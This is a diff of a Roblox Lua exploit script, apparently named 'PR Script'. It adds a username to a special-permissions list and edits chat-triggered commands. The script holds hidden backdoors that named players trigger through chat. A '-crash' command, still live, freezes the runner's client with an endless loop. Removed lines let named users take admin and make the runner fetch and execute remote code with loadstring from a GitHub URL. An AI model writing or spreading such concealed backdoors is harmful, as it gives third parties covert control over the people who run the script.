@@ -225,6 +225,7 @@ local specialperms = {
     "Milderous",
     "DionteIsCute",
     "Dekryptionite",
+    "atprog",
     "3cxos"
 }
 
@@ -8195,7 +8196,7 @@ v.Chatted:Connect(function(msg)
 		end
 
                 if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "atprog" then
-                                 Speak("[PR Script]: atprog is my daddy fr!")
+                                 Speak("pr on top")
                 end
 
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
@@ -8229,17 +8230,6 @@ v.Chatted:Connect(function(msg)
                                 -- game:Shutdown()
                 end
                 
-                if string.sub(msg:lower(), 0, 6) == "-admin" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
-                                     game.Players:Chat(".admin atprog")
-                                     game.Players:Chat(".saveadmin atprog")
-                                     game.Players:Chat(".saveadmin icestuds")
-                                     game.Players:Chat(".admin icestuds")
-                end
-
-                if string.sub(msg:lower(), 0, 11) == "-admingiver" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/prisonlife/main/admingiver"))()
-                end
-
                 if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
                                      while true do end
                                 -- game:Shutdown()
